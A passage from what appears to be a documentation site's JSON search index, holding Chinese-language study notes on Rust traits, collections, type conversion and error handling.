T ; N ]) { // ... } const \u6cdb\u578b\u53c2\u6570\u53ea\u80fd\u63a5\u53d7\u4e0d\u5e26\u5176\u5b83\u6cdb\u578b\u53c2\u6570\u7684\u5b9e\u53c2","title":"\u6cdb\u578b Generics"},{"location":"cs/pl/rust/basic/#trait","text":"\u7279\u5f81\u7c7b\u4f3c\u4e8e python \u4e2d\u7684\u62bd\u8c61\u57fa\u7c7b\uff0c\u89c4\u5b9a\u4e00\u4e9b\u5fc5\u987b\u6709\u7684\u65b9\u6cd5\uff0c\u4f46\u5dee\u522b\u8fd8\u662f\u5f88\u5927 \u5b9a\u4e49 trait pub trait MyTrait { fn func1 ( & self ) -> .. .; // \u5206\u53f7\u7ed3\u5c3e\uff0c\u4e0d\u7528\u5199\u51fd\u6570\u5185\u5bb9 fn func2 ( & self ) -> .. . { .. . // \u63d0\u4f9b\u9ed8\u8ba4\u5b9e\u73b0 } } pub \u5173\u952e\u5b57\u4f7f\u4e4b\u53ef\u4ee5\u4ece\u5916\u90e8\u5bfc\u5165 trait \u5757\u4e2d\u5bf9\u4e8e\u9700\u8981\u5b9e\u73b0\u7684\u65b9\u6cd5\u53ef\u4ee5\u53ea\u5199\u7b7e\u540d\uff0c\u4e5f\u53ef\u4ee5\u5c06\u51fd\u6570\u5199\u5b8c\u6574\u6765\u63d0\u4f9b\u4e00\u4e2a\u9ed8\u8ba4\u5b9e\u73b0 \u4e3a\u7c7b\u578b\u5b9e\u73b0\u7279\u5f81 impl MyTrait for MyType { fn func1 ( & self ) -> .. . { .. . } } \u5b64\u513f\u89c4\u5219\uff1a\u4e3a A \u7c7b\u578b\u5b9e\u73b0\u7279\u5f81 T\uff0c\u5219 A \u548c T \u4e2d\u81f3\u5c11\u6709\u4e00\u4e2a\u5728\u5f53\u524d\u4f5c\u7528\u57df\u4e2d\u5b9a\u4e49\uff0c\u4f8b\u5982\u4e0d\u53ef\u4ee5\u4e3a\u6807\u51c6\u5e93\u4e2d\u7684\u7c7b\u578b\u5b9e\u73b0\u5176\u5b83\u6807\u51c6\u5e93\u4e2d\u7684\u7279\u5f81\u3002\u786e\u4fdd\u67d0\u4e00\u5e93\u4e2d\u7684\u4ee3\u7801\u4e0d\u4f1a\u88ab\u5728\u88ab\u4f7f\u7528\u7684\u65f6\u5019\u7834\u574f \u5982\u679c\u4e00\u4e2a\u7279\u5f81\u7684\u65b9\u6cd5\u90fd\u6709\u9ed8\u8ba4\u5b9e\u73b0\uff0c\u5219\u82b1\u62ec\u53f7\u5185\u53ef\u4ee5\u4e0d\u5199\u4efb\u4f55\u4e1c\u897f \u7279\u5f81\u7ea6\u675f \u53c2\u6570\u91cc\u76f4\u63a5\u5199\u7279\u5f81\u662f\u6cdb\u578b\u7684\u4e00\u4e2a\u8bed\u6cd5\u7cd6\uff0c\u4ee5\u4e0b\u4e24\u884c\u4ee3\u7801\u6548\u679c\u4e00\u6837 pub fn func ( arg : & impl MyTrait ) {} pub fn func < T : MyTrait > ( arg : & T ) {} \u53c2\u6570\u91cc\u6709\u7279\u5f81\u65f6\u4e0d\u4f1a\u5f3a\u5236\u6240\u6709\u8fd9\u6837\u7684\u53c2\u6570\u4e3a\u540c\u4e00\u7c7b\u578b\uff0c\u6bd4\u5982\u4ee5\u4e0b\u4e09\u884c\u4ee3\u7801 1 \u548c 2 \u7b49\u4ef7\u3001\u548c 3 \u4e0d\u7b49\u4ef7 pub fn func ( a : & impl MyTrait , b : & impl MyTrait ) {} pub fn func < T : MyTrait , U : MyTrait > ( a : & T , b : & U ) {} pub fn func < T : MyTrait > ( a : & T , b : & T ) {} \u591a\u91cd\u7ea6\u675f pub fn func ( arg : & ( impl Trait1 + Trait2 )) {} pub fn func < T : Trait1 + Trait2 > ( arg : & T ) {} where \u7ea6\u675f pub fn func < T , U > ( t : & T , u : & U ) -> .. . where T : Trait1 + Trait2 + Trait3 , U : Trait4 + Trait5 + Trait6 {} \u51fd\u6570\u8fd4\u56de\u503c\u53ef\u4ee5\u53ea\u8bf4\u5b9e\u73b0\u4e86\u67d0\u4e2a\u7279\u5f81\u7684\u7c7b\u578b\uff0c\u800c\u4e0d\u660e\u786e\u89c4\u5b9a fn func () -> impl MyTrait {} derive \u53ef\u4ee5\u6d3e\u751f\u7279\u5f81\uff0c\u4f7f\u7528\u9ed8\u8ba4\u5b9e\u73b0\uff0c\u5982\u524d\u9762\u5199\u8fc7\u7684 #[derive(Debug)] Debug\u3001PartialEq\u3001Eq\u3001PartialOrd\u3001Ord\u3001Clone\u3001Copy\u3001Hash\u3001Default \u591a\u4e2a\u7684\u8bdd\u4e2d\u95f4\u9017\u53f7\u5206\u9694 \u8c03\u7528\u5b9e\u73b0\u4e86\u67d0\u4e00\u7279\u5f81\u7684\u7c7b\u578b\u7684\u65b9\u6cd5\u65f6\u9700\u8981\u5148\u7528 use \u5c06\u7279\u5f81\u5f15\u5165 \u4f8b\u5b50 \u4e3a Point \u5b9e\u73b0\u52a0\u6cd5 use std :: ops :: Add ; #[derive(Debug)] struct Point < T : Add < T , Output = T >> { x : T , y : T , } impl < T : Add < T , Output = T >> Add for Point < T > { type Output = Point < T > ; // \u5173\u8054\u7c7b\u578b fn add ( self , p : Point < T > ) -> Point < T > { Point { x : self . x + p . x , y : self . y + p . y , } } } \u4e3a Point \u5b9e\u73b0\u683c\u5f0f\u5316\u8f93\u51fa use std :: fmt ; use std :: fmt :: Display ; impl Display for Point { fn fmt ( & self , f : & mut fmt :: Formatter ) -> fmt :: Result { write! ( f , \"({}, {})\" , self . x , self . y ) } }","title":"\u7279\u5f81 Trait"},{"location":"cs/pl/rust/basic/#_39","text":"\u6bd4\u5982\u4f7f\u7528\u4e00\u4e2a Vec \u6765\u5b58\u50a8\u5b9e\u73b0\u540c\u4e00\u4e2a\u7279\u5f81\u7684\u4e0d\u540c\u7c7b\u578b\u7684\u65f6\u5019\uff0c\u5c31\u9700\u8981\u7528\u5230\u7279\u5f81\u5bf9\u8c61\uff0c\u4f8b\u5982 Vec < Box < dyn MyTrait >> \u4f7f\u7528\u6cdb\u578b\u6765\u4ee3\u66ff\u7684\u8bdd\uff0cVec \u4e2d\u7684\u6240\u6709\u503c\u7c7b\u578b\u5fc5\u987b\u4e00\u81f4 \u53ea\u80fd\u4f7f\u7528 & \u5f15\u7528\u6216\u8005\u4f7f\u7528 Box \u667a\u80fd\u6307\u9488\u6765\u521b\u5efa\u7279\u5f81\u5bf9\u8c61 &dyn MyTrait \u5728\u7528\u7684\u65f6\u5019\u9700\u8981\u7528 & \u501f\u7528 Box<dyn MyTrait> \u5728\u7528\u7684\u65f6\u5019\u9700\u8981\u901a\u8fc7 Box::new(...) \u6765\u57fa\u4e8e\u67d0\u4e2a\u503c\u521b\u5efa\u667a\u80fd\u6307\u9488 \u521b\u5efa\u7684\u65f6\u5019\u4e0d\u9700\u8981\u52a0 dyn \u4e0d\u4f7f\u7528\u8fd9\u4e24\u79cd\u65b9\u6cd5\u7684\u8bdd\uff0c\u5927\u5c0f\u4f1a\u672a\u77e5\uff0c\u4f46 &dyn \u548c Box<dyn> \u5927\u5c0f\u90fd\u5df2\u77e5 dyn \u4ee3\u8868\u52a8\u6001\u5206\u53d1\uff08dynamic dispatch\uff09 \u7279\u5f81\u5bf9\u8c61\u7684\u9650\u5236\uff1a\u53ea\u6709\u5bf9\u8c61\u5b89\u5168\u7684\u7279\u5f81\u624d\u80fd\u521b\u5efa\u7279\u5f81\u5bf9\u8c61 \u5bf9\u8c61\u5b89\u5168\uff1a \u65b9\u6cd5\u7684\u8fd4\u56de\u7c7b\u578b\u4e0d\u80fd\u662f Self \u65b9\u6cd5\u6ca1\u6709\u4efb\u4f55\u6cdb\u578b\u53c2\u6570 Clone \u7279\u5f81\u7684 clone \u65b9\u6cd5\u8fd4\u56de\u7684\u5c31\u662f Self\uff0c\u56e0\u6b64\u5b83\u4e0d\u662f\u5bf9\u8c61\u5b89\u5168\u7684\u3002 Box < dyn Clone > \u7684\u5199\u6cd5\u4f1a\u62a5\u9519","title":"\u7279\u5f81\u5bf9\u8c61"},{"location":"cs/pl/rust/basic/#_40","text":"\u5173\u8054\u7c7b\u578b\u5b9a\u4e49 trait \u5757\u4e2d\uff0c\u53ef\u4ee5\u5728\u540e\u7eed\u7684\u65b9\u6cd5\u4e2d\u4f7f\u7528\u8be5\u7c7b\u578b\u3002\u4f8b\u5982 Iterator \u7684\u5b9a\u4e49\uff1a pub trait Iterator { type Item ; fn next ( & mut self ) -> Option < Self :: Item > ; } \u8fd9\u79cd\u5199\u6cd5\u6bd4\u4e3a Iterator \u589e\u52a0\u4e00\u4e2a\u6cdb\u578b\u66f4\u6709\u53ef\u8bfb\u6027\uff0c\u800c\u4e14\u5199\u8d77\u6765\u4e5f\u7b80\u4fbf","title":"\u5173\u8054\u7c7b\u578b"},{"location":"cs/pl/rust/basic/#_41","text":"\u4f8b\u5982 Add \u8fd9\u4e2a trait\uff1a trait Add < RHS = Self > { type Output ; fn add ( self , rhs : RHS ) -> Self :: Output ; } Add \u7684 RHS \u6cdb\u578b\u53c2\u6570\u5e26\u6709\u4e00\u4e2a\u9ed8\u8ba4\u503c Self\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u5728 impl \u7684\u65f6\u5019\uff0c\u5982\u679c\u4e0d\u4e3a Add \u6307\u5b9a\u7c7b\u578b\uff0c\u5219\u9ed8\u8ba4 RHS \u662f Self\uff0c\u5373\u8981\u52a0\u7684\u4e1c\u897f\u7c7b\u578b\u548c\u88ab\u52a0\u7684\u4e1c\u897f\u7c7b\u578b\u4e00\u81f4\u3002\u4f8b\u5982\uff1a struct Point { x : i32 , y : i32 , } impl Add for Point { // \u9ed8\u8ba4\u5c31\u662f\u8981\u52a0 Point type Output = Point ; fn add ( self , other : Point ) -> Point { .. . } }","title":"\u9ed8\u8ba4\u6cdb\u578b\u7c7b\u578b\u53c2\u6570"},{"location":"cs/pl/rust/basic/#_42","text":"\u5f53\u4e00\u4e2a\u7c7b\u578b\u7684\u65b9\u6cd5\u4e0e\u5b83\u5b9e\u73b0\u7684 trait \u7684\u65b9\u6cd5\u540d\u91cd\u540d\u65f6\uff0c\u76f4\u63a5\u8c03\u7528\u4f1a\u8c03\u7528\u7c7b\u578b\u4e0a\u7684\u65b9\u6cd5\u3002\u60f3\u8981\u8c03\u7528 trait \u4e0a\u7684\u65b9\u6cd5\u65f6\u9700\u8981\u4f7f\u7528 :: \u6765\u663e\u5f0f\u8c03\u7528\uff0c\u5982\uff1a trait A { fn func ( & self ); } trait B { fn func ( & self ); } struct C ; impl A for C { fn func ( & self ) { println! ( \"A\" ); } } impl B for C { fn func ( & self ) { println! ( \"B\" ); } } impl C { fn func ( & self ) { println! ( \"C\" ); } } fn main () { let c = C ; c . func (); // C A :: func ( & c ); // A B :: func ( & c ); // B C :: func ( & c ); // C \u4e0e\u7b2c\u4e00\u4e2a\u76f8\u540c\uff0c\u4f46\u663e\u5f0f\u8c03\u7528 } \u8fd9\u6837\u8c03\u7528\u7684\u4e00\u4e2a\u6761\u4ef6\u662f\u65b9\u6cd5\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f self\uff08\u53c8\u53eb\u65b9\u6cd5\u63a5\u6536\u5668 receiver\uff09\uff0c\u4f46\u5982\u679c\u662f\u5173\u8054\u51fd\u6570\u7684\u8bdd\uff0c\u5c31\u6ca1\u6709\u8fd9\u4e2a receiver\uff0crust \u4e5f\u5c31\u81ea\u7136\u4e0d\u77e5\u9053\u662f\u8c03\u7528\u54ea\u4e2a\u7c7b\u578b\u5b9e\u73b0\u7684\u7279\u5f81\u4e0a\u7684\u65b9\u6cd5 \u8fd9\u65f6\u9700\u8981\u4f7f\u7528\u5b8c\u5168\u9650\u5b9a\u8bed\u6cd5\uff1a < Type as Trait > :: function ( receiver_if_method , next_arg , .. .); \u4f8b\u5982\uff1a trait A { fn func (); } struct B ; impl A for B { fn func () { println! ( \"A\" ); } } impl B { fn func () { println! ( \"B\" ); } } fn main () { B :: func (); // B // A::func(); // \u62a5\u9519 < B as A > :: func (); // A }","title":"\u540c\u540d\u65b9\u6cd5\u8c03\u7528"},{"location":"cs/pl/rust/basic/#trait-trait","text":"\u5982\u679c\u5728\u5b9a\u4e49\u7279\u5f81 A \u7684\u65f6\u5019\u9700\u8981\u4f7f\u7528\u7279\u5f81 B \u7684\u65b9\u6cd5\uff0c\u5219 A \u548c B \u90fd\u8981\u5b9e\u73b0\uff08\u5b9e\u73b0\u4e86\u5c31\u597d\uff0c\u5148\u540e\u65e0\u6240\u8c13\uff09\u3002\u5728\u5b9a\u4e49 A \u7684\u65f6\u5019\u5c31\u53ef\u4ee5\u5728\u540e\u9762\u52a0\u4e0a\u7ea6\u675f B\uff1a trait A : B { .. . }","title":"trait \u5b9a\u4e49\u4e2d\u7684 trait \u7ea6\u675f"},{"location":"cs/pl/rust/basic/#_43","text":"\u7ed5\u8fc7\u5b64\u513f\u89c4\u5219\uff0c\u4e5f\u5c31\u662f\u5728\u5916\u90e8\u7c7b\u578b\u4e0a\u5b9e\u73b0\u5916\u90e8\u7279\u5f81\uff0c\u4e00\u79cd\u65b9\u6cd5\u662f\u4f7f\u7528 newtype \u6a21\u5f0f\uff0c\u5373\u521b\u5efa\u4e00\u4e2a\u5143\u7956\u7ed3\u6784\u4f53\u6765\u5305\u88c5\u5916\u90e8\u7c7b\u578b\uff0c\u8fd9\u6837\u5c31\u6784\u9020\u4e86\u4e00\u4e2a\u5728\u5f53\u524d\u4f5c\u7528\u57df\u5185\u7684\u65b0\u7c7b\u578b \u6bd4\u5982\u60f3\u8981\u4e3a Vec < String > \u5b9e\u73b0 Display trait\uff0c\u4e8c\u8005\u90fd\u5728\u6807\u51c6\u5e93\u4e2d\uff0c\u65e0\u6cd5\u76f4\u63a5\u5b9e\u73b0\u3002\u4f7f\u7528 newtype \u6a21\u5f0f\uff1a use std :: fmt ; struct Wrapper ( Vec < String > ); impl fmt :: Display for Wrapper { fn fmt ( & self , f : & mut fmt :: Formatter ) -> fmt :: Result { write! ( f , \"[{}]\" , self . 0. join ( \", \" )) } } fn main () { let w = Wrapper ( vec! [ String :: from ( \"abc\" ), String :: from ( \"def\" )]); println! ( \"w = {}\" , w ); }","title":"\u7ed5\u8fc7\u5b64\u513f\u89c4\u5219"},{"location":"cs/pl/rust/basic/#_44","text":"","title":"\u96c6\u5408\u7c7b\u578b"},{"location":"cs/pl/rust/basic/#vector","text":"\u52a8\u6001\u6570\u7ec4\uff0c\u7c7b\u578b Vec<T> \u521b\u5efa \u4f7f\u7528 Vec::new() \u521b\u5efa \u5982\u679c\u9884\u5148\u77e5\u9053\u5bb9\u91cf\uff0c\u53ef\u4ee5\u4f7f\u7528 Vec::with_capacity(cap) \u521b\u5efa\uff0c\u4f1a\u63d0\u5347\u6027\u80fd \u4f7f\u7528 vec! \u5b8f\u6765\u521b\u5efa\uff0c\u540c\u65f6\u7ed9\u4e88\u521d\u503c let v = vec! [ 1 , 2 , 3 ]; // \u81ea\u52a8\u63a8\u65ad\u7c7b\u578b \u4f7f\u7528 Vec::from(...) \u6765\u4ece\u6570\u7ec4\u521b\u5efa Vector \u7c7b\u578b\u5728\u79fb\u51fa\u4f5c\u7528\u57df\u540e\u4f1a\u81ea\u52a8\u5220\u9664\uff0c\u5176\u5b58\u50a8\u7684\u5185\u5bb9\u4e5f\u4f1a\u88ab\u5220\u9664 \u64cd\u4f5c .push(...) \u5728\u672b\u5c3e\u6dfb\u52a0\u5143\u7d20 .pop() \u5254\u9664\u672b\u5c3e\u5143\u7d20 .extend(...) \u6269\u5c55 .len() \u83b7\u53d6\u957f\u5ea6 \u53ef\u4ee5\u4f7f\u7528\u5207\u7247\u6765\u501f\u7528\u5143\u7d20\uff08\u8d8a\u754c\u4f1a panic\uff09 .get(index) \u6765\u6839\u636e\u7d22\u5f15\u8bbf\u95ee\u5143\u7d20\uff0c\u8fd4\u56de\u7c7b\u578b\u662f Option<&T>\uff08\u8d8a\u754c\u8fd4\u56de None\uff09 for i in & v \u904d\u5386 \u5229\u7528 enum \u6216\u7279\u5f81\u5bf9\u8c61\u6765\u5b58\u50a8\u4e0d\u540c\u7c7b\u578b\u7684","title":"Vector"},{"location":"cs/pl/rust/basic/#hashmap","text":"\u5b58\u50a8\u952e\u503c\u5bf9\uff0c\u7c7b\u578b HashMap<K, V> \u9700\u8981\u4f7f\u7528 std::collections::HashMap \u5f15\u5165 key \u4e00\u5b9a\u8981\u5b9e\u73b0 Hash \u548c Eq trait f32 \u548c f64 \u4e0d\u53ef\u4ee5 \u521b\u5efa HashMap::new() HashMap::with_capacity(cap) \u4f7f\u7528\u8fed\u4ee3\u5668\u548c collect let lst = vec! [( key1 , value1 ), ( key2 , value2 ), .. .]; let map : HashMap < _ , _ > = lst . into_iter (). collect (); \u64cd\u4f5c .insert(key, value) \u63d2\u5165\u4e00\u4e2a\u952e\u503c\u5bf9 .get(key) \u83b7\u53d6\u503c\uff0c\u8fd4\u56de Option<V> \u7c7b\u578b \u76f4\u63a5\u4f7f\u7528 [key] \u83b7\u53d6\u503c\uff0c\u6ca1\u6709 key \u4f1a panic .entry(key).or_insert(value) \u5982\u679c\u5b58\u5728 key\uff0c\u5219\u8fd4\u56de key \u5bf9\u5e94\u7684\u503c \u5982\u679c\u4e0d\u5b58\u5728 key\uff0c\u5219\u63d2\u5165 key-value \u952e\u503c\u5bf9 \u8fd4\u56de\u4e00\u4e2a &mut V \u5f15\u7528\uff0c\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539 map \u4e2d\u5185\u5bb9 .contains_key(key) \u67e5\u8be2\u662f\u5426\u5b58\u5728 key","title":"HashMap"},{"location":"cs/pl/rust/basic/#_45","text":"\u4e00\u822c\u60c5\u51b5\u4e0b\uff08\u65b9\u6cd5\u8c03\u7528\u9664\u5916\uff09Rust \u4e0d\u4f1a\u8fdb\u884c\u9690\u5f0f\u7684\u7c7b\u578b\u8f6c\u6362 \u4f7f\u7528 as type \u8fdb\u884c\u663e\u5f0f\u7684\u8f6c\u6362 \u8d85\u8fc7\u6700\u5927\u503c\u4f1a\u6ea2\u51fa\uff0c\u5982 300_i32 as i8 \u4f1a\u5f97\u5230 44\uff0c\u800c\u4e0d\u4f1a panic \u5185\u5b58\u5730\u5740\u8f6c\u6362\u4e3a\u6307\u9488 let mut values : [ i32 ; 2 ] = [ 1 , 2 ]; let p1 : * mut i32 = values . as_mut_ptr (); let first_address = p1 as usize ; // \u5c06 p1 \u5185\u5b58\u5730\u5740\u8f6c\u6362\u4e3a\u4e00\u4e2a\u6574\u6570 let second_address = first_address + 4 ; let p2 = second_address as * mut i32 ; // \u8bbf\u95ee\u8be5\u5730\u5740\u6307\u5411\u7684\u4e0b\u4e00\u4e2a\u6574\u6570 p2 unsafe { * p2 += 1 ; } assert_eq! ( values [ 1 ], 3 ); TryInto \u8f6c\u6362 use std::convert::TryInto\uff0c\u4f46\u4e0d\u5fc5\u8981\uff0c\u5728 prelude \u4e2d TryInto trait \u6709 .try_into \u65b9\u6cd5\uff0c\u8fd4\u56de\u4e00\u4e2a Result\uff0c\u4f7f\u7528 .unwrap() \u63d0\u53d6 let a : u16 = 1500 ; let b : u8 = b . try_into (). unwrap (); \u5927\u7c7b\u578b\u8f6c\u6362\u4e3a\u5c0f\u7c7b\u578b\u4f1a\u8fd4\u56de Err(e)","title":"\u7c7b\u578b\u8f6c\u6362"},{"location":"cs/pl/rust/basic/#_46","text":"\u4f8b\u5982\u5728\u8c03\u7528 a.func() \u65f6\uff08a \u7684\u7c7b\u578b\u4e3a T\uff09\uff0c\u7f16\u8bd1\u5668\u4f1a\u8fdb\u884c\u4ee5\u4e0b\u64cd\u4f5c \u5c1d\u8bd5\u503c\u65b9\u6cd5\u8c03\u7528\uff0c\u5373 T::func(a) \u5982\u679c\u4e0a\u4e00\u6b65\u65e0\u6cd5\u5b8c\u6210\uff0c\u5219\u5c1d\u8bd5\u5f15\u7528\u65b9\u6cd5\u8c03\u7528\uff0c\u5373 <&T>::func(a) <&mut T>::func(a) \u5982\u679c\u4e0a\u4e00\u6b65\u4ecd\u7136\u65e0\u6cd5\u5b8c\u6210\uff0c\u5219\u8bd5\u7740\u89e3\u5f15\u7528 T\uff0c\u5982\u679c T \u6ee1\u8db3 Deref<Target = U>\uff0c\u5373 T \u53ef\u4ee5\u88ab\u89e3\u5f15\u7528\u4e3a U\uff0c\u5219\u7f16\u8bd1\u5668\u4f1a\u4f7f\u7528 U \u7c7b\u578b\u5c1d\u8bd5\u8c03\u7528\uff08\u4ece 1 \u5f00\u59cb\u540c\u6837\u7684\u6b65\u9aa4\uff09\uff0c\u79f0\u4e3a\u89e3\u5f15\u7528\u65b9\u6cd5\u8c03\u7528 \u5982\u679c T \u4e0d\u80fd\u88ab\u89e3\u5f15\u7528\uff0c\u4e14 T \u662f\u4e00\u4e2a\u5b9a\u957f\u7c7b\u578b\uff0c\u5219\u7f16\u8bd1\u5668\u4f1a\u5c1d\u8bd5\u5c06 T \u8f6c\u4e3a\u4e0d\u5b9a\u957f\u7c7b\u578b\uff08\u4f8b\u5982 [i32; 2] \u8f6c\u4e3a [i32]\uff09 \u5982\u679c\u4e0a\u9762\u90fd\u4e0d\u884c\uff0c\u5219\u4e0d\u80fd\u901a\u8fc7\u7f16\u8bd1 \u4f8b 1 let array : Rc < Box < [ T ; 3 ] >> = .. .; let a = array [ 0 ]; // \u53ef\u4ee5\u83b7\u53d6\u7b2c\u4e00\u4e2a\u5143\u7d20 \u4f1a\u8fdb\u884c\u4ee5\u4e0b\u6b65\u9aa4\uff1a array[0] \u5b9e\u9645\u4e0a\u8868\u793a array.index(0)\uff08Index trait\uff09 \u68c0\u67e5 array \u662f\u5426\u5b9e\u73b0 Index \u7279\u5f81\uff0cRc<Box<[T; 3]>> \u6ca1\u6709\u5b9e\u73b0\uff0c\u5c1d\u8bd5\u4e0d\u53ef\u53d8\u5f15\u7528\u548c\u53ef\u53d8\u5f15\u7528\uff0c\u90fd\u6ca1\u6709\u5b9e\u73b0\uff0c\u65e0\u6cd5\u8c03\u7528 \u5c1d\u8bd5\u89e3\u5f15\u7528 array\uff0c\u53d8\u4e3a Box<[T; 3]> \u7c7b\u578b\uff0c\u5bf9\u5176\u8c03\u7528 .index(0) Box<[T; 3]>\u3001&Box<[T; 3]>\u3001&mut Box<[T; 3]> \u90fd\u6ca1\u6709\u5b9e\u73b0 Index\uff0c\u65e0\u6cd5\u8c03\u7528 \u89e3\u5f15\u7528 Box<[T; 3]>\uff0c\u5f97\u5230 [T; 3] [T; 3] \u4e5f\u6ca1\u6709\u5b9e\u73b0 Index\uff08\u53ea\u6709\u6570\u7ec4\u5207\u7247\u624d\u53ef\u4ee5\u901a\u8fc7\u7d22\u5f15\u8bbf\u95ee\uff09\uff0c\u5f15\u7528\u3001\u89e3\u5f15\u7528\u90fd\u4e0d\u884c \u5c06\u5b9a\u957f [T; 3] \u8f6c\u4e3a\u4e0d\u5b9a\u957f [T]\uff0c\u4e5f\u5c31\u662f\u6570\u7ec4\u5207\u7247\uff0c\u5b83\u5b9e\u73b0\u4e86 Index\uff0c\u53ef\u4ee5\u8c03\u7528 .index(0) \u65b9\u6cd5 \u4f8b 2 \u5df2\u77e5 clone \u65b9\u6cd5\u7684\u7b7e\u540d\u662f fn clone ( & T ) -> T ; fn func < T : Clone > ( value : & T ) { let cloned = value . clone (); } \u4e0a\u8ff0\u4ee3\u7801\u4e2d\u56e0\u4e3a value \u672c\u8eab\u662f &T \u7c7b\u578b\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u8c03\u7528 clone \u65b9\u6cd5\u5f97\u5230\u4e00\u4e2a T \u7c7b\u578b\u7684 cloned fn func < T > ( value : & T ) { let cloned = value . clone (); } \u4e0a\u8ff0\u4ee3\u7801\u867d\u7136\u6ca1\u6709\u4e3a T \u9650\u5236 Clone \u7279\u5f81\uff0c\u4f46\u662f\u4ecd\u7136\u53ef\u4ee5\u901a\u8fc7\u7f16\u8bd1\u3002\u8fd9\u65f6\u65e0\u6cd5\u76f4\u63a5\u8c03\u7528 value.clone()\uff0c\u6240\u4ee5\u4f1a\u5c1d\u8bd5\u8fdb\u884c\u5f15\u7528\u65b9\u6cd5\u8c03\u7528\uff0c\u6b64\u65f6 T \u53d8\u4e3a &T\uff0c&T \u5b9e\u73b0\u4e86 Clone \u7279\u5f81\uff0c\u6240\u4ee5\u53ef\u4ee5\u8c03\u7528\uff0c\u4f46\u8fd9\u65f6 clone \u7684\u7b7e\u540d\u76f8\u5f53\u4e8e fn clone ( && T ) -> & T \uff0c\u6240\u4ee5\u6700\u540e\u5f97\u5230\u7684\u7ed3\u679c cloned \u7684\u7c7b\u578b\u4e3a &T","title":"\u65b9\u6cd5\u8c03\u7528\u65f6\u7684\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362"},{"location":"cs/pl/rust/basic/#_47","text":"Rust \u8ba4\u4e3a\u7684\u4e24\u79cd\u9519\u8bef\uff1a \u53ef\u6062\u590d\u9519\u8bef\uff0c\u53ea\u5f71\u54cd\u7528\u6237\u81ea\u8eab\u7684\u64cd\u4f5c\uff0c\u4e0d\u4f1a\u5bf9\u7cfb\u7edf\u4ea7\u751f\u5f71\u54cd \u4e0d\u53ef\u6062\u590d\u9519\u8bef\uff0c\u5168\u5c40\u6027\u6216\u8005\u7cfb\u7edf\u6027\u7684\u9519\u8bef\uff0c\u5bf9\u4e8e\u7cfb\u7edf\u5f71\u54cd\u5f88\u5927 Rust \u63a8\u8350\u53ef\u6062\u590d\u9519\u8bef\u4f7f\u7528 Result<T, E> \u8fd4\u56de\u503c\u7b49\u5f85\u540e\u7eed\u5904\u7406\u5f02\u5e38\uff0c\u4e0d\u53ef\u6062\u590d\u9519\u8bef\u76f4\u63a5 panic \u7ec8\u7aef\u7a0b\u5e8f","title":"\u8fd4\u56de\u503c\u4e0e\u9519\u8bef\u5904\u7406"},{"location":"cs/pl/rust/basic/#panic","text":"\u53ef\u4ee5\u901a\u8fc7 panic! \u5b8f\u6765\u76f4\u63a5\u629b\u51fa\u4e00\u4e2a panic \u8fd0\u884c\u65f6\u5e26\u6709 RUST_BACKTRACE=1 \u73af\u5883\u53d8\u91cf\u7684\u8bdd\uff0c\u4f1a\u663e\u793a\u56de\u6eaf\u6808\uff08\u9700\u8981\u5f00\u542f debug \u6807\u5fd7\uff09 panic \u65f6\u6709\u4e24\u79cd\u65b9\u5f0f\u6765\u7ec8\u6b62\uff1a \u6808\u5c55\u5f00\uff1a\u56de\u6eaf\u6808\u4e0a\u6570\u636e\u548c\u51fd\u6570\u8c03\u7528\uff0c\u53ef\u4ee5\u63d0\u4f9b\u5145\u5206\u62a5\u9519\u4fe1\u606f\u548c\u6808\u8c03\u7528\u4fe1\u606f \u76f4\u63a5\u7ec8\u6b62\uff1a\u4e0d\u6e05\u7406\u6570\u636e\uff0c\u76f4\u63a5\u9000\u51fa\u7a0b\u5e8f\uff0c\u4ea4\u7ed9\u7cfb\u7edf\u6765\u6e05\u7406 \u9ed8\u8ba4\u60c5\u51b5\u662f\u6808\u5c55\u5f00 \u76f4\u63a5\u7ec8\u6b62\u7f16\u8bd1\u51fa\u7684\u53ef\u6267\u884c\u6587\u4ef6\u66f4\u5c0f\uff0c\u53ef\u4ee5\u5728 release \u65f6\u6307\u5b9a\u4f7f\u7528\u76f4\u63a5\u7ec8\u6b62\uff1a [profile.release] panic = 'abort' \u5982\u679c\u662f main \u7ebf\u7a0b panic \u4e86\uff0c\u5219\u7a0b\u5e8f\u7ec8\u6b62\u3002\u5982\u679c\u5b50\u7ebf\u7a0b panic \u4e86\uff0c\u5219\u7ebf\u7a0b\u7ec8\u6b62\uff0cmain \u7ebf\u7a0b\u4ecd\u7136\u8fd0\u884c\uff0c\u7a0b\u5e8f\u4e0d\u4f1a\u7ed3\u675f","title":"panic"},{"location":"cs/pl/rust/basic/#result","text":"Result \u662f\u4e00\u4e2a\u679a\u4e3e\u7c7b\u578b\uff0c\u5b9a\u4e49\u4e3a\uff1a enum Result < T , E > { Ok ( T ), Err ( E ), } \u4f7f\u7528 match \u6765\u5904\u7406 Result \u7c7b\u578b \u4f8b\u5982 IO \u9519\u8bef\uff0c\u53ef\u4ee5\u5bf9\u4e8e Err(error) \u518d\u5339\u914d error.kind()\uff0c\u5176\u53ef\u80fd\u7684\u503c\u5728 std::io::ErrorKind \u4e2d \u53ef\u4ee5\u914d\u5408 panic\uff0c\u5c06 error \u7528 debug \u6a21\u5f0f\uff08{:?}\uff09\u8fdb\u884c\u8f93\u51fa \u5bf9\u4e8e Result\uff0c\u5982\u679c\u5931\u8d25\u5c31 panic \u4f7f\u7528 .unwrap()\uff1a\u5982\u679c\u662f Err \u5219\u4f1a panic\uff0c\u5e76\u8f93\u51fa\u9519\u8bef\u5185\u5bb9 \u4f7f\u7528 .expect(\"...\")\uff1a\u540c\u6837 panic\uff0c\u4f46\u4f1a\u663e\u793a\u4e3a panicked at '...: Err \u5185\u5bb9 ' ? \u4f20\u64ad\u9519\u8bef \u5728\u51fd\u6570\u4e2d\u5224\u65ad Result\uff0c\u5e76\u4f20\u9012\u8fd4\u56de Err \u53ef\u4ee5\u5199\u4e3a fn func () -> Result < String , io :: Error > { let f = File :: open ( \"test.txt\" ); let mut f = match f { Ok ( file ) => file , Err ( e ) => return Err ( e ), }; let mut s = String :: new (); match f . read_to_string ( & mut s ) { Ok ( _ ) => Ok ( s ), Err ( e ) => Err ( e ), } } \u5176\u4e2d match-return Err \u90e8\u5206\u53ef\u4ee5\u5229\u7528 ? \u6765\u7b80\u5199\uff1a let mut f = File . open ( \"test.txt\" ) ? ; ? \u5728\u8fd4\u56de 